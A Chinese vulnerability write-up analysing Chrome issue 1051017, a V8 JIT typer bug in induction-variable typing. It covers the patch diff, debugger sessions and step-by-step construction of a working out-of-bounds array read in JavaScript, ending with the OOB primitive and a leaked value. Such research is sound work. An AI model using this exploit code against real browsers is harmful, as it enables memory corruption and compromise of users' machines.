> 原文链接: https://www.anquanke.com//post/id/227284 


# chrome issue 1051017 v8 逃逸


                                阅读量   
                                **181615**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)



## 0x00 前言

chrome issue 1051017是2020年2月公布的一个v8漏洞，该漏洞是在JIT优化时对循环变量的类型估算考虑不周导致的compiler阶段的类型混淆，通过compiler阶段的类型混淆进一步构造OOB溢出。



## 0x01 前置知识

[induction variable](https://baike.baidu.com/item/%E5%BD%92%E7%BA%B3%E5%8F%98%E9%87%8F/53353317?fr=aladdin)指循环中的一个变量，其值在每一次循环迭代过程中增加（或减少）固定的值，也就是循环中的i变量等。有关编译器确定程序中循环变量的算法，可以阅读论文`INTERPROCEDURAL INDUCTION VARIABLE ANALYSIS`。



## 0x02 issue 1051017 分析

### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 14ec856..4e86b96 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -847,30 +847,24 @@
   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());
   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount());

-  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
-  DCHECK(res != induction_vars_-&gt;induction_variables().end());
-  InductionVariable* induction_var = res-&gt;second;
-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
   Type initial_type = Operand(node, 0);
   Type increment_type = Operand(node, 2);

-  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;
-                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);
-  bool maybe_nan = false;
-  // The addition or subtraction could still produce a NaN, if the integer
-  // ranges touch infinity.
-  if (both_types_integer) `{`
-    Type resultant_type =
-        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
-            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)
-            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,
-                                                        increment_type);
-    maybe_nan = resultant_type.Maybe(Type::NaN());
+  // If we do not have enough type information for the initial value or
+  // the increment, just return the initial value's type.
+  if (initial_type.IsNone() ||
+      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) `{`
+    return initial_type;
   `}`

-  // We only handle integer induction variables (otherwise ranges
-  // do not apply and we cannot do anything).
-  if (!both_types_integer || maybe_nan) `{`
+  // We only handle integer induction variables (otherwise ranges do not apply
+  // and we cannot do anything). Moreover, we don't support infinities in
+  // `{`increment_type`}` because the induction variable can become NaN through
+  // addition/subtraction of opposing infinities.
+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
+      increment_type.Min() == -V8_INFINITY ||
+      increment_type.Max() == +V8_INFINITY) `{`
     // Fallback to normal phi typing, but ensure monotonicity.
     // (Unfortunately, without baking in the previous type, monotonicity might
     // be violated because we might not yet have retyped the incrementing
@@ -883,14 +877,13 @@
     `}`
     return type;
   `}`
-  // If we do not have enough type information for the initial value or
-  // the increment, just return the initial value's type.
-  if (initial_type.IsNone() ||
-      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) `{`
-    return initial_type;
-  `}`

   // Now process the bounds.
+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
+  DCHECK(res != induction_vars_-&gt;induction_variables().end());
+  InductionVariable* induction_var = res-&gt;second;
+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
+
   double min = -V8_INFINITY;
   double max = V8_INFINITY;

@@ -946,8 +939,8 @@
     // The lower bound must be at most the initial value's lower bound.
     min = std::min(min, initial_type.Min());
   `}` else `{`
-    // Shortcut: If the increment can be both positive and negative,
-    // the variable can go arbitrarily far, so just return integer.
+    // If the increment can be both positive and negative, the variable can go
+    // arbitrarily far.
     return typer_-&gt;cache_-&gt;kInteger;
   `}`
   if (FLAG_trace_turbo_loop) `{`
diff --git a/test/mjsunit/compiler/regress-1051017.js b/test/mjsunit/compiler/regress-1051017.js
new file mode 100644
index 0000000..16ed22e
--- /dev/null
+++ b/test/mjsunit/compiler/regress-1051017.js
@@ -0,0 +1,34 @@
+// Copyright 2020 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --allow-natives-syntax
+
+
+function foo1() `{`
+  var x = -Infinity;
+  var i = 0;
+  for (; i &lt; 1; i += x) `{`
+    if (i == -Infinity) x = +Infinity;
+  `}`
+  return i;
+`}`
+
+%PrepareFunctionForOptimization(foo1);
+assertEquals(NaN, foo1());
+assertEquals(NaN, foo1());
+%OptimizeFunctionOnNextCall(foo1);
+assertEquals(NaN, foo1());
+
+
+function foo2() `{`
+  var i = -Infinity;
+  for (; i &lt;= 42; i += Infinity) `{` `}`
+  return i;
+`}`
+
+%PrepareFunctionForOptimization(foo2);
+assertEquals(NaN, foo2());
+assertEquals(NaN, foo2());
+%OptimizeFunctionOnNextCall(foo2);
+assertEquals(NaN, foo2());
```

该patch是用于修复`ISSUE 1051017`漏洞的,该patch的批注如下

```
The bug is that induction variable typing does not take into account
that the value can become NaN through addition or subtraction of
Infinities. The previous fix incorrectly assumed that this can only
happen when the initial value of the loop variable is an Infinity.
```

该patch位于`src/compiler/typer.cc`源文件的`Typer::Visitor::TypeInductionVariablePhi`函数，从文件名和函数名可以推出，该函数属于JIT编译器的一部分，并且可能是在`Typer`阶段被调用，且与循环变量(induction variables)有关。

### <a class="reference-link" name="%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"></a>调试分析

为了弄清楚漏洞原理，我们回退到`parent`版本，编译v8引擎以后进行调试，我们使用其给出的poc进行调试

```
function foo() `{`
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    return i;
`}`

%PrepareFunctionForOptimization(foo);
print(Object.is(foo(), NaN));
print(Object.is(foo(), NaN));
%OptimizeFunctionOnNextCall(foo);
print(Object.is(foo(), NaN));
```

在该poc中，i就是`induction variables`，而x就是`increment`<br>
首先`Typer::Visitor::TypeInductionVariablePhi`设置断点，然后运行poc，来到`both_types_integer`的判断

```
857   const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;
   858                                   increment_type.Is(typer_-&gt;cache_-&gt;kInteger);
 ► 859   bool maybe_nan = false;
   860   // The addition or subtraction could still produce a NaN, if the integer
   861   // ranges touch infinity.
   862   if (both_types_integer) `{`
   863     Type resultant_type =
   864         (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7ffda7688b70 —▸ 0x7ffda7688ba0 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 ◂— ...
01:0008│      0x7ffda7688b78 —▸ 0x7f727414f6f3 ◂— and    al, 1
02:0010│      0x7ffda7688b80 ◂— 0x0
03:0018│      0x7ffda7688b88 ◂— 0x100561e3b28c9d0
04:0020│      0x7ffda7688b90 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 —▸ 0x7f72744a74a0 ◂— ...
05:0028│      0x7ffda7688b98 —▸ 0x561e3b28c9d0 ◂— 0x45e00000004
06:0030│      0x7ffda7688ba0 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 —▸ 0x7f72744a74a0 ◂— ...
07:0038│      0x7ffda7688ba8 —▸ 0x7ffda7688bc8 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 ◂— ...
─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────
 ► f 0     7f7274829ec9 v8::internal::compiler::Typer::Visitor::TypeInductionVariablePhi(v8::internal::compiler::Node*)+825
   f 1     7f7274822627 v8::internal::compiler::Typer::Visitor::Reduce(v8::internal::compiler::Node*)+2887
   f 2     7f7274531c97 v8::internal::compiler::GraphReducer::Reduce(v8::internal::compiler::Node*)+231
   f 3     7f72745318b7 v8::internal::compiler::GraphReducer::ReduceTop()+775
   f 4     7f72745312b1 v8::internal::compiler::GraphReducer::ReduceNode(v8::internal::compiler::Node*)+209
   f 5     7f7274531ba0 v8::internal::compiler::GraphReducer::ReduceGraph()+48
   f 6     7f727481b510
   f 7     7f727473faad
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; p both_types_integer
$8 = true
```

因为poc里，`induction variables`i初始值为0，属于`typer_-&gt;cache_-&gt;kInteger`类型，然后`increment`x初始值为`-Infinity`，也属于`typer_-&gt;cache_-&gt;kInteger`类型，因此，接下来会进入if分支

```
862   if (both_types_integer) `{`
   863     Type resultant_type =
 ► 864         (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
   865             ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)
   866             : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,
   867                                                         increment_type);
   868     maybe_nan = resultant_type.Maybe(Type::NaN());
   869   `}`
──────────────────────────────────
```

执行后，`maybe_nan`为false，这样程序顺利绕过了下面的if

```
// We only handle integer induction variables (otherwise ranges
  // do not apply and we cannot do anything).
  if (!both_types_integer || maybe_nan) `{`
    // Fallback to normal phi typing, but ensure monotonicity.
    // (Unfortunately, without baking in the previous type, monotonicity might
    // be violated because we might not yet have retyped the incrementing
    // operation even though the increment's type might been already reflected
    // in the induction variable phi.)
    Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)
                                              : Type::None();
    for (int i = 0; i &lt; arity; ++i) `{`
      type = Type::Union(type, Operand(node, i), zone());
    `}`
    return type;
  `}`
```

接下来就开始正式处理循环逻辑了

```
897   double increment_min;
   898   double increment_max;
   899   if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) `{`
   900     increment_min = increment_type.Min();
   901     increment_max = increment_type.Max();
 ► 902   `}` else `{`
   903     DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);
   904     increment_min = -increment_type.Max();
   905     increment_max = -increment_type.Min();
   906   `}`
```

由于poc里，i执行的操作是`+=`，满足条件`arithmetic_type == InductionVariable::ArithmeticType::kAddition`，因此，`increment_min`等于`-inf`，而`increment_max`等于`inf`，那么就直接进入下面的`else`分支，返回`typer_-&gt;cache_-&gt;kInteger;`类型

```
if (increment_min &gt;= 0) `{`
...
`}` else if (increment_max &lt;= 0) `{`
...
`}` else `{`
    // Shortcut: If the increment can be both positive and negative,
    // the variable can go arbitrarily far, so just return integer.
    return typer_-&gt;cache_-&gt;kInteger;
  `}`
```

回到上层调用，最终发现，该函数在`v8::internal::compiler::Typer::Run`时调用。

```
pwndbg&gt; return
#0  0x00007f72745318b7 in v8::internal::compiler::GraphReducer::ReduceTop (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:156
156      Reduction reduction = Reduce(node);
pwndbg&gt; return
#0  v8::internal::compiler::GraphReducer::ReduceNode (this=0x7ffda768a7a8, node=0x561e3b26f350) at ../../src/compiler/graph-reducer.cc:60
60        `}` else if (!revisit_.empty()) `{`
pwndbg&gt; return
#0  0x00007f7274531ba0 in v8::internal::compiler::GraphReducer::ReduceGraph (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:81
81    void GraphReducer::ReduceGraph() `{` ReduceNode(graph()-&gt;end()); `}`
pwndbg&gt; return
#0  v8::internal::compiler::Typer::Run (this=0x561e3b1baa50, roots=..., induction_vars=0x7ffda768a950) at ../../src/compiler/typer.cc:433
433      if (induction_vars != nullptr) `{`
```

从以上调试情况来看，我们可以知道`Typer::Visitor::TypeInductionVariablePhi`函数是在`Typer`阶段用于确定`induction variables`循环变量的最终类型的。通过调试知道，JIT编译器认为poc里的这个循环，i最终类型为`typer_-&gt;cache_-&gt;kInteger;`，然而，在实际的普通js层，测试发现，i最终类型为`NaN`

```
function foo() `{`
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    return i;
`}`
undefined
foo()
NaN
```

由此，可以知道，该漏洞使得`JIT`层面和普通`JS`层面对循环变量i的类型判断不一致，也就是在`JIT`层面有一个类型混淆。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"></a>漏洞修复分析

我们来看一下该漏洞是如何被修复的

```
-  // We only handle integer induction variables (otherwise ranges
-  // do not apply and we cannot do anything).
-  if (!both_types_integer || maybe_nan) `{`
+  // We only handle integer induction variables (otherwise ranges do not apply
+  // and we cannot do anything). Moreover, we don't support infinities in
+  // `{`increment_type`}` because the induction variable can become NaN through
+  // addition/subtraction of opposing infinities.
+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
+      increment_type.Min() == -V8_INFINITY ||
+      increment_type.Max() == +V8_INFINITY) `{`
```

主要是在原来这个if里面增加了两个条件，判断`increment_type.Min()`和`increment_type.Max()`的值

```
// We only handle integer induction variables (otherwise ranges
  // do not apply and we cannot do anything).
  if (!both_types_integer || maybe_nan) `{`
    // Fallback to normal phi typing, but ensure monotonicity.
    // (Unfortunately, without baking in the previous type, monotonicity might
    // be violated because we might not yet have retyped the incrementing
    // operation even though the increment's type might been already reflected
    // in the induction variable phi.)
    Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)
                                              : Type::None();
    for (int i = 0; i &lt; arity; ++i) `{`
      type = Type::Union(type, Operand(node, i), zone());
    `}`
    return type;
  `}`
```

如果两个值分别为`-V8_INFINITY`和`+V8_INFINITY`，那么经过`type = Type::Union(type, Operand(node, i), zone());`操作，type类型为`NaN`与JS层面保持一致。



## 0x03 issue 1051017 漏洞利用

### <a class="reference-link" name="OOB%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0"></a>OOB数组构造

首先，在原有的基础上加入一个数组

```
function opt(index) `{`
    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    //compiler:Range(1,INF)
    //reality:NaN
    var x = Math.max(i,1);
    return x;
`}`

%PrepareFunctionForOptimization(opt);
print(Object.is(opt(), NaN));
print(Object.is(opt(), NaN));
%OptimizeFunctionOnNextCall(opt);
print(Object.is(opt(), NaN));
```

运行结果并无差异

```
root@ubuntu:~/Desktop/v8/out.gn/x64.debug# ./d8 p.js --allow-natives-syntax
true
true
true
```

我们查看一下IR图<br>
可以发现在`Typer`阶段，`var x = Math.max(i,1);`这句已经形成了一个节点为`Range(1,inf)`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ab096c1218a67a43.png)

我们再来看一下加入修复补丁以后的v8运行的IR图，修复后其值为`NaN`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0154391966a37b1944.png)

现在的情况是编译器认为其值为`Range(1,INF)`，而真实值为`NaN`

```
//compiler:Range(1,INF)
    //reality:NaN
    var x = Math.max(i,1);
```

现在，我们需要利用某种方法，使得`compiler`形成的Range在数组长度之内，而`reality`真值则实际大于数组长度。考虑做如下运算

```
//compiler:Range(-INF,-1)
    //reality:NaN
    x = -x; 
    //compiler:Range(-2,-1)
    //reality:NaN
    x = Math.max(x,-2);
    //compiler:Range(-2,-1)
    //reality:0
    x &gt;&gt;= 0;
```

首先，将区间取反，这样，对于编译器来说是`Range(-INF,-1)`而真值却为`NaN`，接下来再用max函数，使得Range估算为`(-2,-1)`,真值却仍然为`NaN`，然后利用`&gt;&gt;`运算，`&gt;&gt; 0`运算可以使得`NaN`的值变为0，使得编译器认为`Range(-2,-1)`，而真值为0。<br>
然后，我们查看IR图

[![](https://p4.ssl.qhimg.com/t01eada738d883781db.png)](https://p4.ssl.qhimg.com/t01eada738d883781db.png)

正如预料的那样，编译器的最终评估为`Range(-2,-1)`。<br>
为了进一步调试真实值的计算过程，我们使用如下代码进行调试

```
function opt(index) `{`
    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    //compiler:Range(1,INF)
    //reality:NaN
    var x = Math.max(i,1); //
    //compiler:Range(-INF,-1)
    //reality:NaN
    x = -x; //
    //compiler:Range(-2,-1)
    //reality:NaN
    x = Math.max(x,-2);
    //compiler:Range(-2,-1)
    //reality:0
    x &gt;&gt;= 0; //
    return x;
`}`
%PrepareFunctionForOptimization(opt);
print(opt(5));
%OptimizeFunctionOnNextCall(opt);
print(opt(5));
%SystemBreak();
print(opt(5));
```

使用如下参数进行调试

```
set args --allow-natives-syntax ./p.js -print-opt-code
```

在打印出JIT代码和地址后，我们在JIT代码地址出断点然后调试<br>
这里是for循环的逻辑

```
pwndbg&gt; u rip
   0x257b00082b8c    vpsllq xmm3, xmm3, 0x36
   0x257b00082b91    vpsrlq xmm3, xmm3, 2
   0x257b00082b96    vmovapd xmm1, xmm0
   0x257b00082b9a    vmovapd xmm2, xmm0
   0x257b00082b9e    jmp    0x257b00082bb4 &lt;0x257b00082bb4&gt;
    ↓
 ► 0x257b00082bb4    vucomisd xmm3, xmm2
   0x257b00082bb8    seta   dl
   0x257b00082bbb    movzx  edx, dl
   0x257b00082bbe    cmp    edx, 0
   0x257b00082bc1    je     0x257b00082be9 &lt;0x257b00082be9&gt;

   0x257b00082bc7    cmp    rsp, qword ptr [r13 + 0x60]
pwndbg&gt; p $xmm3
$14 = `{`
  v4_float = `{`0, 1.875, 0, 1.875`}`, 
  v2_double = `{`1, 1`}`, 
  v16_int8 = `{`0, 0, 0, 0, 0, 0, -16, 63, 0, 0, 0, 0, 0, 0, -16, 63`}`, 
  v8_int16 = `{`0, 0, 0, 16368, 0, 0, 0, 16368`}`, 
  v4_int32 = `{`0, 1072693248, 0, 1072693248`}`, 
  v2_int64 = `{`4607182418800017408, 4607182418800017408`}`, 
  uint128 = 84987514980498058628394346335474548736
`}`
pwndbg&gt; p $xmm2
$15 = `{`
  v4_float = `{`0, -nan(0x700000), 0, -nan(0x700000)`}`, 
  v2_double = `{`-inf, -inf`}`, 
  v16_int8 = `{`0, 0, 0, 0, 0, 0, -16, -1, 0, 0, 0, 0, 0, 0, -16, -1`}`, 
  v8_int16 = `{`0, 0, 0, -16, 0, 0, 0, -16`}`, 
  v4_int32 = `{`0, -1048576, 0, -1048576`}`, 
  v2_int64 = `{`-4503599627370496, -4503599627370496`}`, 
  uint128 = 340199290171201906239760359964582871040
`}`
```

当for循环逻辑结束后，此时查看循环变量i的值

```
► 0x257b00082bf2    vmovapd xmm3, xmm2
   0x257b00082bf6    vpcmpeqd xmm4, xmm4, xmm4
   0x257b00082bfa    vpsllq xmm4, xmm4, 0x3f
   0x257b00082bff    vxorpd xmm0, xmm4, xmm3
   0x257b00082c03    vpcmpeqd xmm3, xmm3, xmm3
   0x257b00082c07    vpsllq xmm3, xmm3, 0x3e
───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7ffe9b633928 ◂— 0xc /* '\x0c' */
01:0008│      0x7ffe9b633930 ◂— 0x84
02:0010│      0x7ffe9b633938 —▸ 0x257b08240cf5 ◂— 0xb90000020a082801
03:0018│      0x7ffe9b633940 —▸ 0x257b0825018d ◂— 0xe9080406e9082802
04:0020│      0x7ffe9b633948 —▸ 0x257b08240cf5 ◂— 0xb90000020a082801
05:0028│ rbp  0x7ffe9b633950 —▸ 0x7ffe9b6339b0 —▸ 0x7ffe9b6339d8 —▸ 0x7ffe9b633a40 —▸ 0x7ffe9b633a90 ◂— ...
06:0030│      0x7ffe9b633958 —▸ 0x7f23c7e30ad1 (Builtins_InterpreterEntryTrampoline+209) ◂— mov    r14, qword ptr [rbp - 0x18]
07:0038│      0x7ffe9b633960 ◂— 0xa /* '\n' */
─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────
 ► f 0     257b00082bf2
   f 1                c
   f 2               84
   f 3     257b08240cf5
   f 4     257b0825018d
   f 5     257b08240cf5
   f 6     7ffe9b6339b0
   f 7     7f23c7e30ad1 Builtins_InterpreterEntryTrampoline+209
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; p $xmm2
$23 = `{`
  v4_float = `{`0, -nan(0x780000), 0, -nan(0x700000)`}`, 
  v2_double = `{`-nan(0x8000000000000), -inf`}`, 
  v16_int8 = `{`0, 0, 0, 0, 0, 0, -8, -1, 0, 0, 0, 0, 0, 0, -16, -1`}`, 
  v8_int16 = `{`0, 0, 0, -8, 0, 0, 0, -16`}`, 
  v4_int32 = `{`0, -524288, 0, -1048576`}`, 
  v2_int64 = `{`-2251799813685248, -4503599627370496`}`, 
  uint128 = 340199290171201906239762611764396556288
`}`
```

i现在是`-NaN`，执行`x = -x`以后·，来到`x = Math.max(x,-2);`逻辑

```
pwndbg&gt; p $xmm3
$27 = `{`
  v4_float = `{`0, -2, 0, -2`}`, 
  v2_double = `{`-2, -2`}`, 
  v16_int8 = `{`0, 0, 0, 0, 0, 0, 0, -64, 0, 0, 0, 0, 0, 0, 0, -64`}`, 
  v8_int16 = `{`0, 0, 0, -16384, 0, 0, 0, -16384`}`, 
  v4_int32 = `{`0, -1073741824, 0, -1073741824`}`, 
  v2_int64 = `{`-4611686018427387904, -4611686018427387904`}`, 
  uint128 = 255211775190703847611366013629108322304
`}`
pwndbg&gt; p $xmm0
$28 = `{`
  v4_float = `{`0, nan(0x780000), 0, nan(0x700000)`}`, 
  v2_double = `{`nan(0x8000000000000), inf`}`, 
  v16_int8 = `{`0, 0, 0, 0, 0, 0, -8, 127, 0, 0, 0, 0, 0, 0, -16, 127`}`, 
  v8_int16 = `{`0, 0, 0, 32760, 0, 0, 0, 32752`}`, 
  v4_int32 = `{`0, 2146959360, 0, 2146435072`}`, 
  v2_int64 = `{`9221120237041090560, 9218868437227405312`}`, 
  uint128 = 170058106710732674498851936011657674752
`}`
```

最后`&gt;&gt; 0`运算被转换为了如下代码

```
0x257b00082c5e    vcvttsd2si edx, xmm3
   0x257b00082c62    lea    eax, [rdx + rdx]
   RAX  0x0
   RDX  0x80000000
```

通过调试，我们发现，生成的JIT代码是没有问题的，确实是按照`NaN`来运算，`bug`仅出现在`IR`分析阶段。接下来，我们继续构造

```
function opt(index) `{`
    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    //compiler:Range(1,INF)
    //reality:NaN
    var x = Math.max(i,1); //
    //compiler:Range(-INF,-1)
    //reality:NaN
    x = -x; //
    //compiler:Range(-2,-1)
    //reality:NaN
    x = Math.max(x,-2);
    //compiler:Range(-2,-1)
    //reality:0
    x &gt;&gt;= 0; //
    //compiler:Range(0,1)
    //reality:2
    x += 2;
    //compiler:Range(0,7)
    //reality:Range(0,7)
    index &amp;= 0x7;
    //compiler:Range(0,7)
    //reality:Range(0,14)
    index *= x;
    return a[index];
`}`
```

这样可以使得编译器的估测值比真实运算结果小，由此发生溢出。运行发现程序直接崩溃

```
root@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 poc.js --trace-turbo --allow-natives-syntax
Concurrent recompilation has been disabled for tracing.
undefined
---------------------------------------------------
Begin compiling method opt using TurboFan
---------------------------------------------------
Finished compiling method opt using TurboFan
Trace/breakpoint trap (core dumped)
```

分析IR图，`checkbounds`的`Range(0,7)`在数组长度之内，在后续，该`checkbounds`会被移除

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010adfa6d49da0f250.png)

在`V8.TFEffectLinearization 369`阶段，已经没有了边界检查，因此也可以溢出

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01eb68dc5b1eea52b3.png)

从IR图中，未分析出任何异常，因此，我们继续调试JIT代码

```
R8   0x80000000
 R9   0x55f4d8748520 —▸ 0x17608100000 ◂— 0x40000
 R10  0x4023cccccccccccd
 R11  0x5
*R12  0x17608243c81 ◂— 0x310000005408040b
 R13  0x17600000000 —▸ 0x7ffebe6b7a18 ◂— 0x17600000000
 R14  0x1760825009d ◂— 0x89000000e0080409
 R15  0x55f4d87144c0 —▸ 0x7f451f0e2360 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7]
 RBP  0x7ffebe6b67b0 —▸ 0x7ffebe6b6810 —▸ 0x7ffebe6b6838 —▸ 0x7ffebe6b68a0 —▸ 0x7ffebe6b68f0 ◂— ...
 RSP  0x7ffebe6b6780 —▸ 0x7ffebe6b67c0 ◂— 0xa /* '\n' */
*RIP  0x17600082d2b ◂— add    r8d, 2
───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
   0x17600082d12    mov    r11, qword ptr [rbp + 0x10]
   0x17600082d16    sar    r11d, 1
   0x17600082d19    movabs r12, 0x17608243a45
   0x17600082d23    mov    r12d, dword ptr [r12 + 3]
   0x17600082d28    add    r12, r13
 ► 0x17600082d2b    add    r8d, 2
```

调试中看出,在执行`x += 2;`时，x(寄存器r8)的值仍然为`0x80000000`，最终使得运算的下标为`R8   0x8000000a`，即有一个符号位的存在，因此，我们可以在最后添加一个移位操作，用于移除`NaN`计算造成的符号位。完整的OOB构造方法如下

```
function opt(index) `{`
    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    //compiler:Range(1,INF)
    //reality:NaN
    var x = Math.max(i,1); //
    //compiler:Range(-INF,-1)
    //reality:NaN
    x = -x; //
    //compiler:Range(-2,-1)
    //reality:NaN
    x = Math.max(x,-2);
    //compiler:Range(-2,-1)
    //reality:0
    x &gt;&gt;= 0; //
    //compiler:Range(0,1)
    //reality:2
    x += 2;
    //compiler:Range(0,7)
    //reality:Range(0,7)
    index &amp;= 0x7;
    //compiler:Range(0,7)
    //reality:Range(0,14)
    index *= x;
    index &lt;&lt;= 1;
    index &gt;&gt;= 1;
    return a[index];
`}`
%PrepareFunctionForOptimization(opt);
print(opt(5));
%OptimizeFunctionOnNextCall(opt);
print(opt(5));
%SystemBreak();
print(opt(5));
```

运行后发现成功溢出

```
root@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 p.js --allow-natives-syntax
undefined
-8.864952837205469e-7
```

### <a class="reference-link" name="%E7%96%91%E9%9A%BE%E9%97%AE%E9%A2%98"></a>疑难问题

在构造过程中,`var x = Math.max(i,1);`和`x = Math.max(x,-2);`语句中的参数，位置不能调换，否则利用失败。<br>
这是因为`max`函数最终是会被转换为`Float64LessThan`函数，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014313a74ce69645a6.png)

而对于一个`NaN`，任何的比较都是false，因此在这个情况下，`max`运算的真实结果将会是第一个参数

```
NaN == NaN
false
NaN &lt; 1
false
NaN &gt; 1
false
```

而我们的目的就是要让`NaN`参与真实值的计算，因此，不能调换参数的位置。<br>
能否使用`var x = i &lt; 1 ? 1 : i`来代替`max`函数？答案是不行。

